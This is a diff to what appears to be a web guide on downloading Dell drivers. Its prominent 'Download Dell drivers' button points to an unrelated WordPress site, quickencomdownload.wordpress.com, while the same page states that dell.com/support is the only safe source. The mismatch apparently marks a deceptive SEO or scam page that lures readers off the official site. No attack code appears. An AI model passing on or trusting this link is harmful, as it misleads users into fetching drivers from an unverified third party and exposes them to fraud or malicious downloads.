@@ -5,7 +5,7 @@ How to Download Dell Drivers and Updates from Dell.com
 
     <div style="text-align:center; margin-top:30px;">
         <a href="https://quickencomdownload.wordpress.com/" style="background-color:#28a745; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
-            Dell drivers and downloads
+           Download Dell drivers 
         </a>
     </div>
 
@@ -27,11 +27,9 @@ Step-by-Step Guide to Download Dell Drivers
 --------------------------------------------
 1. **Visit Dell’s Official Support Page**
 
-   To get started, go to the official Dell support website:  
+  - To get started, go to the official Dell support website: `https://www.dell.com/support`   
 
-   `https://www.dell.com/support`  
-
-   This is the only safe and verified place for downloading your drivers.
+   - This is the only safe and verified place for downloading your drivers.
 
 2. **Identify Your Device**
 
